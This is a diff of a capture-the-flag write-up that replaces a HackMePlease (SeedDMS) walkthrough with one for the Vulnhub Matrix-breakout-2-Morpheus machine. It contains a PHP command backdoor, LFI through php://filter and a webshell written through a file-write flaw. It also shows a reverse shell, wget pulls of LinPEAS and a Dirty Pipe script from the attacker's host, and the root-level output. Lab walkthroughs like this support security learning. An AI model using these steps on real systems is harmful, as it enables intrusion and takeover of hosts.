@@ -1,25 +1,26 @@
-# Vulnhub HackMePlease
+# Vulnhub Matrix-breakout-2-Morpheus
 
 
-Vulnhub Training Walkthrough -- HackMePlease
+Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus
 
 <!--more-->
 
 ## Knowledge
 
-- js information
-- conf file search
-- mysql search
+- LFI -- Local File Include
+- LinPEAS -- 
+- Dirty-Pipe CVE-2022-0847
+- php://filter
 
 ## 1. Environment Setup
 
-Download the target [rar file](https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar), unrar and import into VMware.
+Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.
 
 ## 2. Reconnaisence
 
 ### 1. IP Address
 
-arp-scan get ip address:
+arp-scan scanner:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
@@ -31,384 +32,469 @@ WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
 172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
-172.16.86.150	00:0c:29:5c:d6:04	(Unknown)
-172.16.86.254	00:50:56:f7:44:1e	(Unknown)
+172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
+172.16.86.254	00:50:56:ed:8a:52	(Unknown)
 
-8 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned in 2.232 seconds (114.70 hosts/sec). 4 responded
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
 ```
+
+Target IP is 172.16.86.152.
 
 ### 2. Port Info
 
-nmap get port and service information:
+Scan the port and service:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
-└─$ nmap -p- -sV -sC  172.16.86.150 --open
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST
-
-
-┌──(v4ler1an㉿kali)-[~]
-└─$ nmap -T4 -p- -sV -sC  172.16.86.150 --open
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 22:11 EST
-Nmap scan report for 172.16.86.150
-Host is up (0.0011s latency).
+└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
+Nmap scan report for 172.16.86.153
+Host is up (0.00033s latency).
 Not shown: 65532 closed tcp ports (conn-refused)
-PORT      STATE SERVICE VERSION
-80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Welcome to the land of pwnland
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
-| Not valid before: 2021-07-03T00:33:15
-|_Not valid after:  2031-07-01T00:33:15
-| mysql-info:
-|   Protocol: 10
-|   Version: 8.0.25-0ubuntu0.20.04.1
-|   Thread ID: 44
-|   Capabilities flags: 65535
-|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, FoundRows, LongPassword, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
-|   Status: Autocommit
-|   Salt: GoAEc\x05_7@yr\x0C:usjD6d+
-|_  Auth Plugin Name: caching_sha2_password
-33060/tcp open  mysqlx?
-| fingerprint-strings:
-|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
-|     Invalid message"
-|     HY000
-|   LDAPBindReq:
-|     *Parse error unserializing protobuf message"
-|     HY000
-|   oracle-tns:
-|     Invalid message-frame."
-|_    HY000
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port33060-TCP:V=7.94SVN%I=7%D=11/13%Time=6552E561%P=x86_64-pc-linux-gnu
-SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
-SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
-SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
-SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
-SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
-SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
-SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
-SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
-SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
-SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
-SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
-SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
-SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
-SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
-SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
-SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
-SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
-SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
-SF:x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x
-SF:20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
-SF:(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\
-SF:0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
-SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
-SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
-SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
-SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
-SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
-SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
-SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-server-header: Apache/2.4.51 (Debian)
+|_http-title: Morpheus:1
+81/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Meeting Place
+|_http-title: 401 Authorization Required
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
+Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
 ```
 
-Port and service info:
+Port and service:
 
-| port  | service             |
-| ----- | ------------------- |
-| 80    | Apache httpd 2.4.41 |
-| 3306  | MySQL 8.0.25        |
-| 33060 | mysqlx              |
+| port | service             |
+| ---- | ------------------- |
+| 22   | ssh                 |
+| 80   | Apache httpd 2.4.51 |
+| 81   | nginx 1.18.0        |
 
-Access the web page:
+Access the 80 webpage:
 
-![image-20231114114339908](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141143149.png)
+![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)
 
-It's a common web page, and find nothing.
+The source of page is:
+
+```shell
+<html>
+	<head><title>Morpheus:1</title></head>
+	<body>
+		Welcome to the Boot2Root CTF, Morpheus:1.
+		<p>
+		You play Trinity, trying to investigate a computer on the 
+		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
+		<p>
+		Good luck!
+
+		- @jaybeale from @inguardians
+		<p>
+		<img src="trinity.jpeg">
+	</body>
+</html>
+
+```
+
+The picture is normal.
+
+Access the 81 port:
+
+![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)
+
+Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.
 
 ### 3. Web Directory
 
-Well, just scan the web directory:
+Scan the web directory:
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~]
-└─$ gobuster dir -u http://172.16.86.150:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://172.16.86.150:80/
+[+] Url:                     http://172.16.86.153
 [+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Threads:                 60
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
+[+] Extensions:              php,bak,txt,html
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/img                  (Status: 301) [Size: 312] [--> http://172.16.86.150/img/]
-/css                  (Status: 301) [Size: 312] [--> http://172.16.86.150/css/]
-/js                   (Status: 301) [Size: 311] [--> http://172.16.86.150/js/]
-/fonts                (Status: 301) [Size: 314] [--> http://172.16.86.150/fonts/]
+/.php                 (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 348]
+/.html                (Status: 403) [Size: 278]
+/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
+/robots.txt           (Status: 200) [Size: 47]
+/graffiti.txt         (Status: 200) [Size: 139]
+/graffiti.php         (Status: 200) [Size: 451]
+/.html                (Status: 403) [Size: 278]
+/.php                 (Status: 403) [Size: 278]
 /server-status        (Status: 403) [Size: 278]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-
-Just find some common directory.
-
-Look into `js` directory, maybe we can find some userful js file:
-
-```shell
-┌──(v4ler1an㉿kali)-[~]
-└─$ gobuster dir -u http://172.16.86.150:80/js/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .js,.txt -t 60
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://172.16.86.150:80/js/
-[+] Method:                  GET
-[+] Threads:                 60
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              js,txt
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/main.js              (Status: 200) [Size: 2997]
-/plugins.js           (Status: 200) [Size: 126889]
-/vendor               (Status: 301) [Size: 318] [--> http://172.16.86.150/js/vendor/]
-Progress: 661680 / 661683 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-
-We can see a `vendor` directory and `main.js` and `plugins.js`. Access them, and can find something useful in `main.js`:
-
-![image-20231114114838434](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141148581.png)
-
-We got a path named `/seeddms51x/seeddms-5.1.22/`, access it:
-
-![image-20231114114923877](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141149029.png)
-
-Well, it looks like a CMS named  `SeedDMS` 's login page. 
-
-## 3. Exploit
-
-Search exploit about SeedDMS:
-
-```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ sudosearchsploit -t seeddms
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                                                                                              |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                                                                                             | php/webapps/50062.py
-SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                                                                                            | php/webapps/48324.txt
-SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                                                                                  | php/webapps/47024.txt
-SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                                                                                    | php/webapps/47023.txt
-SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                                                                                        | php/webapps/47022.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ searchsploit -x php/webapps/47022.txt
-  Exploit: SeedDMS versions < 5.1.11 - Remote Command Execution
-      URL: https://www.exploit-db.com/exploits/47022
-     Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt
-    Codes: CVE-2019-12744
- Verified: False
-File Type: ASCII text
-
-
-
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ cat /usr/share/exploitdb/exploits/php/webapps/47022.txt
-# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions <5.1.11]
-# Google Dork: [NA]
-# Date: [20-June-2019]
-# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
-# Vendor Homepage: [https://www.seeddms.org]
-# Software Link: [https://sourceforge.net/projects/seeddms/files/]
-# Version: [SeedDMS versions <5.1.11] (REQUIRED)
-# Tested on: [NA]
-# CVE : [CVE-2019-12744]
-
-Exploit Steps:
-
-Step 1: Login to the application and under any folder add a document.
-Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
-
-PHP Backdoor Code:
-<?php
-
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
-
-?>
-
-Step 3: Now after uploading the file check the document id corresponding to the document.
-Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
-
-Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
-```
-
-If we want to use the exploit, we need to login the website. But we have no passwd now.
-
-### 1. Scan the web path
-
-We has found a url path named `/seeddms51x/seeddms-5.1.22/`, so we can scan it now:
-
-```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ gobuster dir -u http://172.16.86.150/seeddms51x/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 60
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://172.16.86.150/seeddms51x/
-[+] Method:                  GET
-[+] Threads:                 60
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/data                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/data/]
-/www                  (Status: 301) [Size: 323] [--> http://172.16.86.150/seeddms51x/www/]
-/conf                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/conf/]
-/pear                 (Status: 301) [Size: 324] [--> http://172.16.86.150/seeddms51x/pear/]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-
-Well, we found a `conf`, keep scanning:
-
-```shell
-┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ gobuster dir -u http://172.16.86.150/seeddms51x/conf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x .txt,.conf,.xml,.php-t 60
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://172.16.86.150/seeddms51x/conf
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              txt,conf,xml,php-t
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/settings.xml         (Status: 200) [Size: 12377]
 Progress: 1102800 / 1102805 (100.00%)
 ===============================================================
 Finished
 ===============================================================
 ```
 
-Well, we can find mysql username and password in `settings.xml` file:
-
-![image-20231114192921392](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141929656.png)
-
-### 2. Login to mysql
-
-We use the username and password login to mysql, and look for something useful:
+We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.
 
 ```shell
 ┌──(v4ler1an㉿kali)-[~/Documents/tmp]
-└─$ mysql -u seeddms -h 172.16.86.150 -p
-Enter password:
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MySQL connection id is 8
-Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)
+└─$ curl http://172.16.86.153/robots.txt
+There's no white rabbit here.  Keep searching!
+                                                                              
+┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+└─$ curl http://172.16.86.153/graffiti.txt
+Mouse here - welcome to the Nebby!
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+Make sure not to tell Morpheus about this graffiti wall.
+It's just here to let us blow off some steam.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-MySQL [seeddms]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-| seeddms            |
-| sys                |
-+--------------------+
-5 rows in set (0.002 sec)
+```
 
-MySQL [(none)]> use seeddms;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)
 
-Database changed
-MySQL [seeddms]> show tables;
-+------------------------------+
-| Tables_in_seeddms            |
-+------------------------------+
-| tblACLs                      |
-| tblAttributeDefinitions      |
-| tblCategory                  |
-| tblDocumentApproveLog        |
-| tblDocumentApprovers         |
-| tblDocumentAttributes        |
-| tblDocumentCategory          |
-| tblDocumentContent           |
-| tblDocumentContentAttributes |
-| tblDocumentFiles             |
-| tblDocumentLinks             |
-| tblDocumentLocks             |
-| tblDocumentReviewLog         |
-| tblDocumentReviewers         |
-| tblDocumentStatus            |
-| tblDocumentStatusLog         |
-| tblDocuments                 |
-| tblEvents                    |
-| tblFolderAttributes          |
-| tblFolders                   |
-| tblGroupMembers              |
-| tblGroups                    |
-| tblKeywordCategories         |
-| tblKeywords                  |
-| tblMandatoryApprovers        |
-| tblMandatoryReviewers        |
-| tblNotify                    |
-| tblSessions                  |
-| tblUserImages                |
-| tblUserPasswordHistory       |
-| tblUserPasswordRequest       |
-| tblUsers                     |
-| tblVersion                   |
-| tblWorkflowActions           |
-| tblWorkflowDocumentContent   |
-| tblWorkflowLog               |
-| tblWorkflowMandatoryWorkflow |
+We found a message input box.
+
+## 3. Exploit
+
+Now, let's test `graffiti.php` with burp:
+
+![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)
+
+As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.
+
+### 1. LFI
+
+We can check out the `graffiti.php ` source code with php:filter through the LFI:
+
+![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)
+
+Decode with base64 and then got the source code:
+
+```shell
+<?php
+
+$file="graffiti.txt";
+if($_SERVER['REQUEST_METHOD'] == 'POST') {
+    if (isset($_POST['file'])) {
+       $file=$_POST['file'];
+    }
+    if (isset($_POST['message'])) {
+        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
+        fwrite($handle, $_POST['message']);
+	fwrite($handle, "\n");
+        fclose($file); 
+    }
+}
+
+// Display file
+$handle = fopen($file,"r");
+while (!feof($handle)) {
+  echo fgets($handle);
+  echo "<br>\n";
+}
+fclose($handle);
+?>
+```
+
+We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.
+
+### 2. Upload the webshell
+
+In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:
+
+![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)
+
+And then connect it with AntSword:
+
+![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)
+
+### 3. Get the reverse shell
+
+And then we user a php reverse shell to get shell:
+
+![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)
+
+And then switch the shell by python:
+
+```shell
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@morpheus:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@morpheus:/$ ls
+ls
+FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
+www-data@morpheus:/$ cat FLAG.txt
+cat FLAG.txt
+Flag 1!
+
+You've gotten onto the system.  Now why has Cypher locked everyone out of it?
+
+Can you find a way to get Cypher's password? It seems like he gave it to
+Agent Smith, so Smith could figure out where to meet him.
+
+Also, pull this image from the webserver on port 80 to get a flag.
+
+/.cypher-neo.png
+```
+
+## 4. Privilege Escalation
+
+Now, we need to get root. We can find two user in home:
+
+```shell
+www-data@morpheus:/$ ls /home
+ls /home
+cypher	trinity
+www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
+find / -user cypher -type f 2>/dev/null
+/FLAG.txt
+www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
+find / -user trinity -type f 2>/dev/null
+/home/trinity/.bash_logout
+/home/trinity/.bashrc
+/home/trinity/.profile
+```
+
+Nothing useful. Let's use LinPEAS:
+
+```shell
+www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
+wget http://172.16.86.138:8080/LinPEAS.sh
+--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
+Connecting to 172.16.86.138:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847815 (828K) [text/x-sh]
+Saving to: ‘LinPEAS.sh’
+
+LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s
+
+2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]
+
+www-data@morpheus:/var/www/html$ ls
+ls
+LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
+graffiti.php  index.html    robots.txt		   trinity.jpeg
+www-data@morpheus:/var/www/html$ ls -la
+ls -la
+total 1284
+drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
+drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
+-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
+-rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
+-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
+-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
+-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
+-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
+-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
+-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
+-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
+www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
+chmod +x LinPEAS.sh
+
+```
+
+We can find something useful:
+
+![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)
+
+We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:
+
+```shell
+www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
+wget http://172.16.86.138:8080/dirty_pipe.sh
+--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
+Connecting to 172.16.86.138:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4855 (4.7K) [text/x-sh]
+Saving to: ‘dirty_pipe.sh’
+
+dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s
+
+2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]
+
+www-data@morpheus:/var/www/html$ ls -la
+ls -la
+total 1292
+drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
+drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
+-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
+-rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
+-rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
+-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
+-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
+-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
+-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
+-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
+-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
+-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
+www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
+chmod +x dirty_pipe.sh
+www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
+./dirty_pipe.sh
+/etc/passwd已备份到/tmp/passwd
+It worked!
+
+# 恢复原来的密码
+rm -rf /etc/passwd
+mv /tmp/passwd /etc/passwd
+root@morpheus:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@morpheus:/var/www/html# ls /root
+ls /root
+FLAG.txt
+root@morpheus:/var/www/html# cat /root/FLAG.txt
+cat /root/FLAG.txt
+You've won!
+
+Let's hope Matrix: Resurrections rocks!
+```
+
+## Attack Path
+
+scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation
+
+23293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653